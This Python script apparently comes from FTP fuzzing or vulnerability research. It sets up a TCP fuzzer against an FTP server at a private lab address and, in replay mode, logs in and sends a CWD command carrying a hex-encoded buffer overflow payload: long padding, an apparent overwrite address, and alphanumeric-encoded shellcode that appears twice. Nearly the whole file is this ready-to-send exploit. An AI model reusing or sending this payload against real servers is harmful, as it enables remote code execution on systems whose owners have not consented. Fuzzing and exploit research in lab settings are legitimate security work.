#!/usr/bin/python
# -*- coding: UTF-8 -*-

from cpf.fuzzer.TCPFuzzer import TCPFuzzer


def fuzz_cwd(data):
    return "CWD " + data


if __name__ == '__main__':

    fuzzer = TCPFuzzer(host="192.168.245.135", port=21,
                       sample_path="sample/ftp",
                       nomal_trans_conf="data/ftputility.json",
                       logseq_count=3)

    relay = True

    if not relay:
        fuzzer.fuzz(start_state=2, mutate_max_count=10, callback=fuzz_cwd)
    else:

        seqs = [[{"recv": "66726565", "send": "5553455220667265650D0A"},
                 {"recv": "6f67676564", "send": "5041535320667265650D0A"},
                 {"recv": "",
                  "send": "435744205553455220414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141d12e0d0941414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141eb0359eb05e8f8ffffff494949494949494949494949494949493749515a6a46583041315042416b4241564232424132414130414158503842427569796b4c716a786b704f6d385969496f696f6b4f61704c4b706c357466446c4b7375456c4c4b316c555562585441386f6e6b504f57684c4b336f65705661386b6973503037396c4b50344e6b7771586e34714b704a396e4c6b344f30643435576b716b7a566d533178427a4b6964356b32746134764844354d334c4b636f564437715a4b50666e6b666c326b4c4b314f454c7551386b3443764c4c4b6b39724c4574476c63517a6345614f3053544e6b673030304c4b6370344c4e6b3430376c4e4d4e6b715041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141eb0359eb05e8f8ffffff494949494949494949494949494949493749515a6a46583041315042416b4241564232424132414130414158503842427569796b4c706a786b704f6d385969496f696f6b4f61704c4b706c357466446c4b7375456c4c4b316c555562585441386f6e6b504f57684c4b336f65705661386b6973503037396c4b50344e6b7771586e34714b704a396e4c6b344f30643435576b716b7a566d533178427a4b6964356b32746134764844354d334c4b636f564437715a4b50666e6b666c326b4c4b314f454c7551386b3443764c4c4b6b39724c4574476c63517a6345614f3053544e6b673030304c4b6370344c4e6b3430376c4e4d4e6b71505558614e73586e6e704e644e686c70504b4f6b663031494b5066527353563068747357424358616761637562636f3634496f585045384a6b4a4d396c574b5630696e5a76436f4d59786535364c41486d666837727145624a64426b4f385035386e3964497a554c6d3147796f6e36563362737273305371437733305367333633596f7a70306670687671736c417672736f797a414c5532484c64445a74304a675637496f4a76517a4450427153656b4f385030686f544e4d446e79793057796f6856414330554b4f4a7052484d3567396f76304933676b4f4a767270636461443055496f38504c5365384b5772596a6663497277696f785641454b4f6a707066706a6354617630684353724d6c496865535a7050536976496a6c6f794d37617a67344e69597237416b706a534c6a596e5372564d596e3372646c6c534e6d425a35684c6b6e4b4e4b724844326b4e4d635456796f434532646b4f6b66336b53673052636166315271535a744156313271736550514b4f5a7032486c6d4a794775484e62736b4f7a76617a6b4f6b4f35676b4f68506e6b31474b4c6d53684441744b4f4e363632496f685075386c304f7a5664314f4363596f4a764b4f3850464242424242424242424242425558614e73586e6e704e644e686c70504b4f6b663031494b5066527353563068747357424358616761637562636f3634496f585045384a6b4a4d396c574b5630696e5a76436f4d59786535364c41486d666837727145624a64426b4f385035386e3964497a554c6d3147796f6e36563362737273305371437733305367333633596f7a70306670687671736c417672736f797a414c5532484c64445a74304a675637496f4a76517a4450427153656b4f385030686f544e4d446e79793057796f6856414330554b4f4a7052484d3567396f76304933676b4f4a767270636461443055496f38504c5365384b5772596a6663497277696f785641454b4f6a707066706a6354617630684353724d6c496865535a7050536976496a6c6f794d37617a67344e69597237416b706a534c6a596e5372564d596e3372646c6c534e6d425a35684c6b6e4b4e4b724844326b4e4d635456796f434532646b4f6b66336b53673052636166315271535a744156313271736550514b4f5a7032486c6d4a794775484e62736b4f7a76617a6b4f6b4f35676b4f68506e6b31474b4c6d53684441744b4f4e363632496f685075386c304f7a5664314f4363596f4a764b4f38504642424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242efbeaddedeadbeef"}]]

        for seq in seqs:
            fuzzer.replay(seq)
